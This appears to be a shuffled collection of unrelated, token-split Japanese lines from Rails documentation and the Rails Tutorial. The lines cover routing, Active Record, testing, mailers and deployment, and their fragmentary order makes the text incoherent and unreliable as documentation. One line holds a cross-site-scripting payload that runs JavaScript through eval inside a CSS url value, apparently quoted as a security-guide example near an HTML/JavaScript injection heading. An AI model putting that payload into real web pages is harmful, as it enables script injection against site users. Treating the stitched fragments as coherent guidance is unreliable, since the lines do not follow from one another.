▁これは 、 コンパイル されて JavaScript や CSS になる ような 中 間 ファイルは マッチ ャ の 対象 から すべて 除 外 される ということです ▁( 純 粋 な JavaScript / CSS と同様 )▟ たとえば 、` ▖ coffee ` と ` ▖ scss ` ファイルは コンパイル 後に それぞれ JavaScript と CSS になるので 、 これらは 自動的に は インクルード されません 。
▁$ ▁rails ▁new ▁blog
▁<%= ▁field _ set _ tag ▁do ▁%>
▁この 追加 の 節 は 、\ href { http :// screencasts ▖ railstutorial ▖ org /}{ Ruby ▁on ▁Rails チュートリアル スクリーンキャスト シ リ ー ズ } ▁( 原 著者 の 主 催 する 有 料 スクリーンキャスト : ▁ 英語 のみ ) ▁ で使用する テスト 用 設定 について解説します 。
▁production 環境 の Rails で SendGrid を使用する 設定
▁ これはリスト \ ref { code : about _ view } で使用されていました 。
▁ 理解 が 困難
▁この フォーム は ` POST ` リクエストを ` / articles / : article _ id / comments ` に 送信 します ▟ これ に対応する のは ` Blorgh :: Comments Controller ` の ` create ` アクション です 。
▁これにより 、 リモート 環境 に バ ッ ク アップ を 置く ことができ 、 本番環境で 発生 する エラーを なるべく 早 期 に 発 見 することができます 。
▁#### ▁HTML / JavaScript インジェクション
▁{0} 表 2▖1 : ▁{/0}{1} Users リソース における 、 ページ と URL の関係 {/1} 。
▁たとえば 、 与えられた 課題 の 解決 法 に 今 ひとつ 確 信 が 持 て ない ときは 、( テストを 書 か ずに ) ▁ まず 試 し に アプリケーションコード だけ を書いて み て 、 どんな 解決 方法 がある のか 模 索 してみる 方が 良い 結果を 得 られる こともあります
▁上のように 変更 することで 、 Active ▁Record は customer オブジェクトの コピー を 1 つだけ 読み込む ようになり 、 不 整 合 を防ぐ と 同時に アプリケーションの 効率 も 高 まり ます 。
▁リスト \ ref { code : follow _ unfollow _ following } のコード を追加する ことで 、 テストスイート は ▁\ passing ▁ になるはずです 。
▁ 具体的には 、\ k ode { correct \_ user } フィルター 内で \ k ode { find } メソッドを呼び出す ことで 、 カレント ユーザーが 削除 対象 の マイクロポストを 保 有 している かどうかを確認 します 。
▁ すべての ユーザーが フィード を持つ ので 、\ k ode { feed } メソッドは User モデルに 作る のが 自 然 です 。
▁ 問題 となっている のは 、 デフォルト ▁( Rails ▁3▖2 ▖ 3 の場合 ) ▁ で Micropost モデルの \ emph { すべて } の 属性 が アクセス可能 になっている ことです 。
▁ この種の オブジェクトの 構 文 は 、\ emph { Proc } ▁( 手 続 き : ▁ procedure ) ▁ と か \ emph { ラ ム ダ ▁( lambda )} と呼ばれ 、\ k ode { - > } という 矢 印 で 表 されます 。
▁User ページ 用の 最初の テスト ▁( {2}{3}{/3}{3}{4} green {/4}{/3}{3}{/3} {/2} )
▁Action ▁View を Rails で使用する
▁ レイアウト の 指定 に シンボル を使用することで 、 リクエストが 実際に 処理 される とき まで レイアウト を 確 定 せず 、 選択 を 遅 延 することができます 。
▁さらに 申し上げ ると 、 この種の 永続的セッション を 手動で 確 認 するのは 非常に 面倒な ので 、\ k ode { current _ user } を リファクタリング する のであれば ▁( {1} 第 {2} 10 {/2} 章 {/1} で 行う 予定です ) ▁ 同時に テスト も 作成 しておくこと が重要です 。
▁production 環境 から メール送信 するために 、「 SendGrid 」 という Heroku ア ド オン を使用して アカウント を検証します
▁### ▁ エンジン を マウント する
▁validates ▁: password , ▁confirmation : ▁true ,
▁ 他の 解決策 として CSS で \ emph { 表示 } サイズ を 調 整 する方法 もあります が 、 これ だと ファイル サイズ が 変わりません 。
▁Help ページの HTML を修正する
▁ //= ▁require ▁ bootstrap
▁ モデル をチェックする ための さまざまな メソッドが 用意されています ▟ 属性 が 空 で ないこと 、 一意 であること 、 既に データベースに ないこと 、 特定の フォーマット に従って い ること など 、 多 岐 に わ た った 検証 が 行えます 。
▁この ファイルは エンジンの コントローラ 共通の 機能を 提供する ためのものです 。
▁def ▁update _ name
▁m ▖ reachable ?
▁### ▁ ルーティング グ ロ ブ と ワ イ ル ド カ ー ド セグメント
▁Client ▖ order (: orders _ count , ▁created _ at : ▁: desc )
▁Active ▁Record は 、 データベースに 恒久 的に 保存 される 必要のある ビ ジ ネ ス オブジェクト の作成 と 利用 を 円滑 に 行 な え る ようにします 。
▁{0}{1} 第 2 章 {/1}{/0} で 簡 易 的な マイクロポスト 投 稿 フォーム に 触れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記 述 した Micropost データモデル を作成し 、 User モデルと \ k ode { has _ many } および \ k ode { belongs _ to } メソッドを使って 関連付けを 行い 、 さらに 、 結果を 処理 し 表示 するために必要な フォーム と その 部品 を作成します ▁(\ ref { sec : microposts _ with _ images } で 画像 の アップロード も 実装します ) 。
▁Active ▁Record では 、` joins ` メソッドを使用して 関連付け で ` JOIN ` 句 を指定する 際に 、 モデル で 定義された 関連付け の名前 を シ ョ ート カ ッ ト として 使用できます ▁( 詳細は [ Active ▁Record の関連付け ]( association _ basic s ▖ html ) を参照 ) 。
▁ マイクロポストの データモデル
▁ ログイン と ログアウト の 要素を 、 Sessions コントローラの 特定の REST アクションに それぞれ 対応 付ける ことにします ▟ ログイン の フォーム は 、 この節 で 扱 う \ k ode { new } アクション で 処理 します ▟\ k ode { create } アクションに \ text tt { POST } リクエストを送信する と 、 実際に ログイン します ▁(\ ref { sec : logging _ in })▟ \ k ode { destroy } アクションに \ text tt { DELETE } リクエストを送信する と 、 ログアウト します ▁(\ ref { sec : logging _ out })
▁Rails で こういった 情報 を表示する ためには 、\ emph { flash } という 特殊な 変数 を使います ▟ この 変数 は ハッシュ のように 扱 います 。
▁1 番目の \ k ode { git ▁ checkout ▁- b ▁modify - README } コマンドで 、 ブランチ の 新規 作成 と その ブランチ への 切り 替 え が 同時に 行われている ことにご注目ください ▟\ k ode { modify - README } ブランチ に 「 * 」 が 付 い ていること で 、 この ブランチ が 現在 使用 中 であること が示されています
▁第 \ ref { cha : filling _ in _ the _ layout } 章では 、 この章 で学んだ 内容 を サンプルアプリケーションの 開発 に 活 か していきます 。
▁{0} 図 11 ▖5{/0}{1} Home ページに ステータスフィード が表示され 、 フォロー の カウント が 1 増え た ▟\ href { http :// railstutorial ▖ org / images / figures / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁1 3 ▖ to _ s (: rounded , ▁ precision : ▁5 ) ▁# ▁=> ▁1 3▖0 0 000
▁このヘルパーは 、2 つの テキストフィールド が 完全に 一致する 内容 を 受け取る 必要がある 場合に 使用します 。
▁ただし 、 この オプションは ` as : ▁: value ` オプション と 併 用 できません 。
▁<%= ▁javascript _ include _ tag ▁" application " ▁%>
▁このコードは 、 既に 有効 になっている ユーザーを 誤 って 再度 有効化 しない ために 必要です ▟ 正 当 で あ ろ う と な か ろ う と 、 有効化 が 行われ ると ユーザーは ログイン 状態 になります ▟ もし このコード が なければ 、 攻撃者が ユーザーの 有効化 リンクを 後 から 盗 み だ して クリック するだけで 、 本 当 のユーザー として ログイン できてしまいます ▟ そう した 攻 撃 を防ぐ ために このコード は非常に 重要です 。
▁# ▁updated _ at ▁: datetime
▁@ articles ▁= ▁Article ▖ all
▁この あたり で 、 Active ▁Record で ユーザー オブジェクト を検索する 方法を 学 んで みましょう 。
▁[ コンテンツ タイプ を 読み込む 元の サイト を 制御 するための 強力な メ カ ニ ズ ム ]( http :// w 3 c ▖ github ▖ io / web app sec / spec s / content - security - p ol ic y / c s p - specific ation ▖ dev ▖ html ) です 。
▁current _ user ▖ increment ! ▁: visit s
▁ユーザー と 関連付け された マイクロポストの fixture
▁* ▁` ENV [" RAILS _ ENV "] ` は 、 Rails が 実行される 環境 ▁( production 、 development 、 test など ) ▁ を定義します 。
▁ メール で URL が必要な場合は ` * _ url ` ヘルパー を使用してください 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁この 例 では Ruby ▁ 1▖9▖3 以上 のバージョン を 前提と しています 。
▁ 最新の RVM を使用する ようにしてください ) 。
▁create _ table ▁: assemblies ▁do ▁| t |
▁しかし 、 実際に 不 明 な 定数 が原因で ` articles _ helper ▖ rb ` が ` NameError ` エラーを 発生 する という 場合 が考えられます 。
▁#### ▁` to _ sentence `
▁" hello ▁world "
▁ これら を 合わせ ると 、 次の フォームの 要素 を探し だ して テストが 行われます 。
▁このコードは リスト \ ref { code : hello _ action _ redux _ 2 } で使用されていました ▟ もうひとつ 、
▁TIP : ▁ _ ` namespace ` ブロック の 内部で 異なる コントローラ 名前空間 を使用した い のであれば 、「 ` get ▁' / foo ' ▁=> ▁' / foo # index ' ` 」 のような 絶 対 コントローラ パス を指定することもできます ▟ _
▁JRuby 環境で PostgreSQL を採用する 場合 、` config / database ▖ yml ` の 記 述 方法は 少し 異なります 。
▁ ポリモーフィック関連付け の詳細については [ この ガイド の 説明 ](# ポリモーフィック関連付け ) を参照してください 。
▁この プロセス は 苦 痛 で 、 バグ も 発生 し が ち です 。
▁#### ▁` assert _ valid _ keys `
▁NOTE : ▁Ruby の メソッドは ` public `、` private `、` protected ` に分け られます が 、 コントローラのアクション に な れる のは ` public ` メソッド だけです 。
▁ Linux を実行し ている 場合は 、 この時点で 、 他にも いくつかの パッケージ をインストール する必要が 生じる 場合 があります 。
▁この テーブル は モデルを 表 さ ないので 、` create _ table ` に ` id : ▁false ` を 渡します 。
▁ 利用 可能な 最新の アダプタ の リスト については 、 API ドキュメント の [ ActiveJob :: Q ue ue Adapters ]( http :// api ▖ rubyonrails ▖ org / classes / ActiveJob / Q ue ue Adapters ▖ html ) ▁ を参照してください 。
▁( 本チュートリアル では 常に \ k ode { - m } フラグ を使用する ようにしています ) 。
▁上の ルーティング では 、` / photos ` で始まる ブラウザから の パス を 認 識 し 、 この リクエストを ` Photos ` コントローラに ルーティング します が 、 ヘルパー の 命 名 に `: as ` オプション の値 が使用されます 。
▁ Flash メッセージ の キー が [ 文字列 に 正 規 化 ]( https :// github ▖ com / rails / rails / commit / a 6 6 8 be f fd 64 1 06 a 1 e 1 fe db 7 1 cc 25 ea a a 11 b a f 0 c 1 ) ▁ されました ▟ シンボル または 文字列 のどちら でも アクセス できます 。
▁ 前 者 の 問題 を \ ref { sec : signup _ error _ messages } で 、 後者の 問題 を \ ref { sec : signup _ success } で それぞれ 解決 していきます 。
▁デフォルトでは 、 関連付け によって 探 索 される オブジェクトは 、 現在の モジュール の スコープ 内の もの だけです 。
▁\ k ode { form _ for } の代わりに \ k ode { form _ tag } を使用して 、 サインイン フォーム を リファクタリング してください 。
▁ inflect ▖ ir regular ▁' to oth ', ▁' te e th '
▁ バックポート が どの ぐらい 難 し くなる か は 場合 によって 大きく 異なります ▟ ときには 、 それ ほど の 手 間 を かけて バックポート する ほど の 意味 がない こともあります 。
▁ これはリスト \ ref { code : activation _ token _ test } で使用されていました 。
▁従って 、
▁ テストスイート が 以前 と同様に パス すること も 確認してください 。
▁ 多数の レコード に対して 反 復 処理を 行いたい ことがあります ▟ たとえば 、 多くの ユーザーに ニ ュ ー ス レ ター を送信し たい 、 データを エ ク ス ポート したい など です 。
▁次の {0}{1} 第 7 章 {/1}{/0} では 、 ユーザー を作成するための ユーザー登録フォーム を作成し 、 各 ユーザーの 情報 を表示する ための ページ も 作成します 。
▁ 違い と い えば 、 Active ▁Record の ▁ _ 関連付け ▁( ア ソ シ エ ー ション ) _ ▁ を設定する ための ` belongs _ to ▁: article ` という 行 がある 点 です 。
▁```
▁これで テストにパス するはずです 。
▁\ k ode { bundle ▁install } に 特殊な フラグ 「 - - with out ▁production 」 を追加する と 、 本番 用の gem ▁( この場合は \ text tt { pg } と \ text tt { rails _ 12 factor }) ▁ は ローカル の 環境 には インストール されません 。
▁self を省略した 結果を リスト \ ref { code : branch _ raise } に示します 。
▁詳細については [ E rubi s ドキュメント ]( http :// www ▖ k u w at a - lab ▖ com / e rubi s / users - guid e ▖ 06 ▖ html # to p ic s - tr im space s ) を参照してください 。
▁ この時点で 、 全て のテスト が ▁\ passing ▁ になるはずです 。
▁# ▁ または
▁### ▁` redirect _ to ` を使用する
▁ 静的ページ の 端 正 になった テスト 。
▁ デフォルトで サポート されている 言語 は 、 CSS に 代 わ る S A S S 、 JavaScript に 代 わ る CoffeeScript 、 CSS / JavaScript に 代 わ る ERB です 。
▁ユーザー登録 が 終 わ って から ユーザーに 手 動 ログイン を 促 す と 、 ユーザーに 余分な 手順を 強 い ること になるので 、 ユーザー登録 中に ログイン を 済 ま せ ておく ことにします 。
▁belongs _ to ▁: article
▁上のコード でも タイトル 全体 と マッチ します 。
▁### ▁ 関連付けの スコープ 制御
▁" hello "▖ from ( - 2 ) ▁# ▁=> ▁" lo "
▁style =" background : url (' javascript : eval ( document ▖ all ▖ my code ▖ ex p r ) ') ">
▁record ▖ errors [ attribute ] ▁<< ▁( options [: message ] ▁|| ▁" は 正しい メールアドレス ではありません ")
▁リスト \ ref { code : hello _ root _ route } のとき
▁beginning _ of _ year ▁( at _ beginning _ of _ year )
▁ 複数の オブジェクトが 集 ま った セット に対して ` url _ for ` を使用することもできます ▟ 複数の オブジェクト を渡して も 、 適切な ルーティング が自動的に 決定 されます 。
▁ これはリスト \ ref { code : micropost _ ordering _ test } で使用されていました 。
▁| ▁POST ▁| ▁ / geocoder ▁| ▁ geocoder s # create ▁| ▁ geocoder を作成する ▁|
▁$ ▁bundle ▁exec ▁rake ▁- T ▁db
▁Rails コンポーネント を構成する
▁ここまで で 、 記事 の作成 、 表示 、 一覧 表示 が できるようになりました 。
▁# ▁ Turbolinks ▁make s ▁following ▁links ▁in ▁your ▁web ▁application ▁faster ▖
▁2 番目の 問題 について ですが 、 統合テスト で 2 種類の ブラウザ を シ ミ ュ レ ート するのは 正 直 かなり 困難 です ▟ その 代 わ り 、 同じ 問題 を User モデル で 直接 テスト する だけ なら 簡単に 行えます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / wrap ▖ rb ` です 。
▁NOTE : ▁ プリコンパイル 配列 に Sass や CoffeeScript ファイル など を追加する 場合にも 、 必ず ▖ js や ▖ css で 終 わ る ファイル名 ▁( つまり コンパイル 後 の ファイル名 として 期 待 されている ファイル名 ) ▁ も 指定 してください 。
▁ 本書 の 第 1 章 は 、 さ し ず め ロー ス ク ー ル で言う ところ の 「 淘汰 期間 」( 訳 注 : ▁そこで 生 き 残 れる かどうかを 選 別 する 期間 ) ▁ のような もの である ▟ 本 章で 開発環境 の 構 築 に 成功 できた 人 なら ば 、 最 後 まで や り 通 す ことは 難 しく ありません 。
▁ 生成された To y アプリケーションは ブラウザの アドレス バー に URL を 入力 すれば 動 か せ ます ▟ これ を使用して 、 Rails アプリ の 構造 と Rails で 推 奨 されている \ emph { REST アーキテクチャ } について 考 察 する ことにします 。
▁ 代わりに 、 特定 \ k ode { user _ id } に対する マイクロポストの 数を データベースに 問い合わせ ます 。
▁ doc rails は 定 期 的に master に マージ されます ので 、 Ruby ▁on ▁Rails ドキュメント の 編集 を 効率 よく 行えます 。
▁これは i 18 n ( 国 際 化 ) 用の 翻 訳 ファイル で 発生 する こともあります 。
▁gem ▁' jquery - rails '
▁`: shallow _ prefix ` オプションを使用すると 、 指定された パラメータを ▁( パス ではなく ) ▁名前付きヘルパー 名 の冒頭 に追加します 。
▁( 上で は 2 番目の 引数 \ k ode { token } の名前 を変更 して 、 メソッドが 一 般 化 された ことを あえて 強 調 しています ) 。
▁ここで 、 記憶トークン として 何 を使用する か を 決 め る必要があります 。
▁上の パターン から 、 それ以外の ディレクトリ を含む \ emph { すべて } の spec を実行する 以下の 方法 も 容易に 想 像 が つ く と思います 。
▁ 異なる 種類の ロック を使用したい場合 、` lock ` メソッドに 生の SQL を 渡す こともできます 。
▁また 、 自分 を フォローしているユーザー と 、 自分 が フォローしているユーザー を 同時に 表示 できるようにします 。
▁debug ( my _ hash )
▁\ ref { sec : logging _ in } では 、 セッションを 操作 するために必要な コード をいくつか 追加 し 、 ユーザーログイン を完成させ る 予定です 。
▁ 基本 タイトル を含め た StaticPages コントローラの テスト
▁ 以前の Rails では 完全な JavaScript コード を挿入 していました が 、 Rails ▁3 から このように HTML プロパティ を使用して 簡単に JavaScript を使用できます ▟ これは 、\ href { http :// r ailscasts ▖ com / episodes / 20 5 - u nobtrusive - javascript }{\ emph { JavaScript を 前 面 に 出 す べ から ず } } という 哲 学 に従って います 。
▁ 実は { p 0} の {2} palindrome {/2} 内で {2} reverse {/2} ▁ メソッドを使って い たとき も 、 同様 の ケース で あった ことを思い出してください ▟ その ときと同様 で 、 左 式 では {2} self {/2} を省略 することは \ emph { できません } ▟ したがって 、
▁User Mailer ▖ week ly _ summary ( user )▖ deliver _ now
▁$ ▁rake ▁test
▁たとえば 、 上の ルーティング は アプリケーションで 以下のような パス として 認 識 されます 。
▁この レイアウトファイル を有効に するには 、 デフォルトの タイトル 部分を 以下の 埋め込み Ruby のコード に 差し替え ます 。
▁ したがって 、 今回の 用 途 では \ emph { ハッシュ化 された パスワード } と \ emph { 暗号化 された パスワード } は 類 義 語 となります 。
▁ 実は 、 メンバ が 一 様 でない ▁( さまざまな 種類の メンバ が 入 り 混 じ った ) ▁ コレクション にも 上の 方法 を使用できます ▟ この場合 、 コレクション の メンバ に応じて 適切な パーシャル が自動的に 選択 されます 。
▁has _ many ▁: comments
▁ すべての ページに 適用 される 共通の スタイル を CSS に追加する
▁Rails は 、 これまで 実行 されていない マイグレーション だけ を 適切に 見 分 け て 実行 します ので 、 以下のような メッセージ だけ が表示される はずです 。
▁" F al se Class " ▁=> ▁" boolean ",
▁ Scaffold 機能 で コードを 自動生成 すると 、 Web の あらゆる 部分 から モデル データ にアクセス して やりとり できるように なる 。
▁# ▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁nil >
▁redirect _ to ▁@ article
▁ユーザー登録 後 の ログイン のテスト
▁<%= ▁render ▁partial : ▁@ products , ▁ space r _ template : ▁" product _ ru ler " ▁%>
▁index ビュー が 起動 し 、 ERB ▁( Embedded ▁R u B y : ▁ ビューの HTML に 埋 め 込 まれ ている Ruby コード ) ▁ を実行して ▁HTML を 生成 ▁( レンダリング ) ▁ する 。
▁上の例では 、` s tree t ` ではなく ` address _ s tree t ` が生成されます 。
▁< option ▁value =" 3 "> To b ia s </ option >
▁Cucumber では フィーチャー と ステップ が 分 離 されている ことにより 、 抽 象 度 の高い 記 述 が 可能 である という 効果 があります 。
▁ singleton でない 数字 にも 、 複 製 不 可能な もの があります 。
▁しかし 、 この スコープ で できる 機能 は 、 クラスメソッド で できる 機能 と 重複 しています 。
▁ 記憶ダイジェスト を 持 た ない ユーザー を用意し ▁(\ k ode { setup } メソッド で定義した \ k ode {@ user } インスタンス変数 では true になります ) 、 続いて \ k ode { authenticated ?} を呼び出します ▁( Listing ▁\ ref { code : test _ authenticated _ invalid _ token }) 。
▁# ▁Use ▁the ▁existing ▁token ▖
▁これにより 、 その サーバー の アセット に対する リクエスト 数を 減 ら す ことができ 、 アセットを ローカル ブラウザの キャッシュ や その他の 中 間 キャッシュ で 代 替 する よい 機 会 が与えられ ます 。
▁<%= ▁link _ to ▁" Home ", ▁main _ app ▖ root _ path ▁%>
▁create ▁app / job s / guest s _ cleanup _ job ▖ rb
▁\ k ode { logged \_ in \_ user } メソッドを Application コントローラに 移 す
▁self を省略した 結果を リスト \ ref { code : action _ tests _ admin } に示します 。
▁ 技術 上 は 、1 つの ルーティング に 2 つ 以上の ワ イ ル ド カ ー ド セグメント を含め ること は 可能です 。
▁ 再 現 手順 など に あ い ま い な 点 がある なら 、 ど こ が わかりにくい か を 指 摘 しましょう 。
▁ 読み 取り 専 用 を 指定された オブジェクト に対する 変更 の 試 み はすべて 失敗 し 、` ActiveRecord :: Re ad Only Record ` 例外が発生します 。
▁[ Sign ▁in ] ▁ リンク の 非 表示
▁さらに 、 本チュートリアル は Web 開発 の ベ テ ラン にとって も 有用です ▟ MVC や REST 、 ジェネレータ 、 マイグレーション 、 ルーティング 、 ERB など 、 Rails フレームワーク の コア 技術 を 本チュートリアル で まとめて 学ぶ ことができます 。
▁デフォルトのエラーメッセージは ▁_" must ▁be ▁ greater ▁than ▁or ▁equal ▁to ▁% { count } " _ ▁ です 。
▁$ ▁bundle ▁exec ▁rake ▁test
▁PATCH ▁ / articles / : id (▖ : format ) ▁articles # update
▁\ k ode { users } テーブルに \ k ode { password \_ digest } カラム を追加する マイグレーション
▁ グループ 化 した 項目 の 合 計 を ひとつ の クエリ で 得 る には 、` group ` の 次に ` count ` を呼び出します 。
▁ 開発 中に \ href { https :// en ▖ w i k tion ary ▖ org / wiki / S N A F U } { 袋 小 路 } に 迷 い 込 んで しま った 場合 でも 、 これらの 機能 を使えば 元の 状態 を 復 元 できます 。
▁invoke ▁ scss
▁date ▖ advance ( years : ▁1, ▁ weeks : ▁2 ) ▁# ▁=> ▁Mon , ▁20 ▁Jun ▁2011
▁[ Upload ▁image ] ▁ ボタン と 画像 付き マイクロポスト のモックアップ を 図 \ ref { fig : micropost _ image _ mockup } に示します
▁A ▁test ▁of ▁\ k ode { authenticated ?}
▁` collection ▖ find ` メソッドは 、 コレクション に含まれる オブジェクトを 検索 します 。
▁#### # ▁` association = ( associate ) `
▁client ▁= ▁Client ▖ last (3)
▁class ▁H o li day ▁< ▁ActiveRecord :: Base
▁Git に プロジェクト の ファイル を追加する と 、 最初は \ emph { ステージング エリア } という 一種の 待 機 用 リポジトリ に置かれ 、 コミット を 待 ち ます ▟ 安全 の ため 、 い き なり コミット しないよう になっている のです 。
▁(1▖▖10 0 )▖ sum ▁# ▁=> ▁50 50
▁ 一 人 の 顧客 は 、 多くの 注文 を 行なうことができます 。
▁| ▁| ▁4 3 1 ▁| ▁: request _ header _ field s _ to o _ large ▁|
▁with _ options ▁ dependent : ▁: destroy ▁do ▁| assoc |
▁ このコード では 、 Bootstrap の ド ロ ッ プ ダ ウ ン メニュー に関連する CSS の id と クラス が与えられ ていることに注目してください 。
▁\ k ode { git ▁log } を 終 了 するには \ k ode { q } キーを 押 してください 。
▁ ログインフォーム のコード ▁( 再 掲 )
▁NOTE : ▁ マイグレーション で ` t ▖ integer ▁: supplier _ id ` のように 「 小文字 の モデル名 _ id 」 と 書く と 、 外部キー を明示的に指定 できます 。
▁` & & ▁return ` ではなく ` and ▁return ` を使用してください ▟ ` & & ▁return ` は Ruby 言語 の & & 演算子 の 優 先 順 位 が 高 す ぎ て この 文 脈 では 正常に動作し ません 。
▁resources ▁: quot es
▁create ▁app / controllers / blorgh / comments _ controller ▖ rb
▁ 紛 ら わ しい エラーを 回 避 するためには 、 CarrierWave の設定 を変更 し 、 テスト 環境では 画像 リ サイズ を し ないようにする 必要がある ので 、 リスト \ ref { code : skip _ re size _ initializer } に 示す 設定ファイル を使って ください 。
▁StaticPages コントローラ内の \ k ode { home } アクションと \ k ode { help } アクション で使用する ルーティング 。
▁ユーザー を作成する アクション
▁Article ▖ none ▁# ▁=> ▁この場合 [ ] または nil を返し 、 呼び出し 側 の コードを 中 断 する
▁これで すべての テストにパス するはずです ▟ これで 、 存在性 の検証 は 完成 しました 。
▁\ k ode { destroy ▖ js ▖ erb } ファイル の方 も同様です ▁( リスト \ ref { code : destroy _ js _ erb }) 。
▁ 最 長 の ユーザー名 の長さ に 科 学 的な 根拠 はありません ので 、 単 に \ k ode { 50 } を 上 限 として 手 頃 な 値 を使う ことにします ▟ つまり ここでは 、\ k ode { 51 } 文字 の名前 は 長 すぎる こと を検証します 。
▁middleware s ▁= ▁[]
▁# ▁=> ▁Sun , ▁ 16 ▁Sep ▁2012 ▁00:00:00 ▁UTC ▁+00:00 ▖ ▖
▁ これはリスト \ ref { code : initial _ failing _ signin _ test } で使用されていました 。
▁ データ構造 の 循 環 検出
▁この 「\ k ode { < }」 記 号 を 「 〜 より 少 ない 」 と 読んで しま う と 、「 パスワード 再設定 メール送信 時 から 経 過 した 時間 が 、2 時間 より 少 ない場合 」 と なってしまい 、 ここで 行 お う と している こと と 反 対 の 意味 になってしまいます 。
▁たとえば 、 production 環境 を ミ ラ ー コピー した サーバー がある が 、 テスト 目的 で のみ 使用 したい という 場合 を 想 定 してみましょう 。
▁` delegate ` を使用すれば できるようになります 。
▁create ▁ spec / request s / static _ pages _ spec ▖ rb
▁ 問題が生じ た場合 は 、 エラーメッセージ を Google で 検索 するか 、\ href { http :// railstutorial ▖ org / help } { Rails チュートリアル の Help ページ } を参照してください 。
▁ユーザー を新規作成する には 、 図 \ ref { fig : demo _ new _ user _ rails _3} の \ href { http :// localhost :3000/ users / new }{\ text tt { new } } ページ を表示します
▁ 典型的な base 64 の 文字列 は 、 次のような ものです 。
▁ 新規ユーザー 作成 ページ ▁(\ href { http :// localhost :3000/ users / new }{/ users / new })
▁# ▁This ▁file ▁is ▁copie d ▁to ▁ spec / ▁when ▁you ▁run ▁' rails ▁generate ▁ rspec : install '
▁それでは 、 リスト \ ref { code : micropost _ migration } を マイグレーション 使って 、 いつものように データベース を更新し てみましょう 。
▁ メイラー アクション で定義した インスタンス変数 は 、 他の アクション や ビュー と同様 、 メイラー の ビュー から 参 照 できる 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁たとえば 、 プログラム のライフサイクル が 続 く 間 、 整 数 の 1 は 常に 同じ インスタンス を参照 します 。
▁ テスト 手順 は し ん ぷ る です 。
▁customer
▁subject : ▁" 添付 の 利用 規 約 を参照してください ",
▁ここで の アクセス制御 の ポイント は 単 純 です ▟\ k ode { create } アクションと \ k ode { de s to ry } アクションは 、 いずれも ユーザ が サインイン し ていなければ 実行 できない もの とします 。
▁なお エ キ ス パ ート 向 け には 、 ブロック が \ emph { ク ロー ジ ャ } になっている という ことを 知 って い ただ く と 理解 し やすい と思います ▟ ク ロー ジ ャ とは 、 データを 伴 う 、 その 場 限り の 無名 関数 です 。
▁{0} 図 8 ▖6{/0}{1} サインイン に 失敗した ときの フラッシュメッセージ ▟\ href { http :// railstutorial ▖ org / images / figures / failed _ signin _ flash _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Rails が この レイアウト を 処理 し 、 埋め込み Ruby を 評価 すると 、 上の リスト は 以下 に置き 換 わ ります 。
▁Rails アプリケーションを 新規 作成した ら 、 次は \ emph { Bundler } を実行して 、 アプリケーション に必要な gem をインストール および インクルード します 。
▁続いて 、 ログイン の 統合テスト を含む 全 テストスイート を実行し てみると 、 ▁\ passing ▁になることを確認 できます 。
▁end
▁この User モデルの 例 の場合 、 マイグレーション は モデル 生成 スクリプト によって自動的に 作 ら れ ました ▟ リスト \ ref { code : users _ migration } に示したように ▁\ k ode { name } と \ k ode { email } の 2 つの カラム を持つ \ k ode { users } テーブル を作成します
▁ これまで ご 紹 介 した 3 通り の 出力 方法 ▁( コントローラ内の 別 テンプレート を使用 、 別の コントローラの テンプレート を使用 、 ファイルシステム 上の 任意の ファイル を使用 ) ▁ は 、 実際には 同 一 の アクション の バ リ エ ー ション に す ぎ ません 。
▁ 末 尾 の ▁" _ id " ▁ の アンダースコア が 不要な 場合は 引数に ` false ` を指定します 。
▁この 点を 明 確 にする ため 、\ emph { Rails チュートリアル } では 、「 Rails ルート 」 については \ emph { ( Rails で作成した ) Web アプリケーションのルート ディレクトリ } を指す もの とします ▟ また 、 すべての ディレクトリ は 、 この ルート ディレクトリ を 起 点 と した 相 対 パス で 示 します 。
▁TIP : ▁ パーシャル について の詳細 は 本ガイド の [ レイアウト と レンダリング ]( layouts _ and _ render ing ▖ html ) を参照してください 。
▁# ▁ Validations ▁with ▁no ▁< tt > : on </ tt > ▁option ▁will ▁run ▁no
▁このとき 、 ユーザーの ローカル変数 ▁(\ k ode { user }) ▁ を インスタンス変数 ▁(\ k ode {@ user }) ▁ に変更し た 点 に注目し てください ▟ これは 、 リスト \ ref { code : relationships _ controller _ following } のとき は インスタンス変数 は 必要 なかった のですが 、 リスト \ ref { code : follow _ form _ ajax } や リスト \ ref { code : unfollow _ form _ ajax } を実装 した ことにより 、 インスタンス変数 が必要 になった ためです 。
▁リスト \ ref { code : has _ many _ following _ through _ passive _ relationships } と 違 って 必要 の ない \ k ode { : source } キー をそのまま 残 している のは 、\ k ode { has _ many ▁: following } と の 類似 性 を 強 調 させるため です 。
▁` Blorgh :: Article ` モデルの ` set _ author ` メソッドは 以下の クラス も 使用 する必要があります 。
▁ここで 、 URL が \ href { http :// localhost :3000/ users /1}{/ users /1 } と 表示され ていることに注目してください ▟ ご想像 のとおり 、 この 数字 \ k ode {1} は 図 \ ref { fig : demo _ user _ model } ▖ の \ k ode { id } 属性 その ものです 。
▁< aside >
▁( 6 ▁rows )
▁ これを行うには \ href { https :// github ▖ com / meta s kill s / mini _ backtrace }{\ text tt { mini _ backtrace } } ▁gem ▁( リスト \ ref { code : gemfile _ sample _ app }) ▁ と \ emph { backtrace ▁ silencer } を 組み合わせ ます 。
▁ これを行うには \ href { http :// en ▖ w ikipedia ▖ org / wiki / C all back _ ( computer _ science ) }{\ emph { コールバック } } という テクニック を 利用 します ▟ コールバック とは 、 Active ▁Record オブジェクトが 持 続 している 間 の どこか の 時点 で 、 Active ▁Record オブジェクト に 呼び出し てもらう メソッドです ▁( Rails ▁API の 「\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 4/ classes / ActiveRecord / Callbacks ▖ html } { コールバック の 登録 ポイント } ▁( 英語 )」 を参照してください ) 。
▁ 本 章 から 、 本格的な サンプルアプリケーションの 開発 を 進 め ていきます ▟ 残 り の チュートリアル では 、 この アプリケーションを 例 題 として 扱 って 学習 して い く ことになります 。
▁before _ filter に \ k ode { signed _ in _ user } を追加する 。
▁Ruby の {0} モジュール {/0} という 機能 を使用すると 、 そう した 関数 を 一 箇所 に パッケージ 化 できる ことを { p 1 } で 学 び ました 。
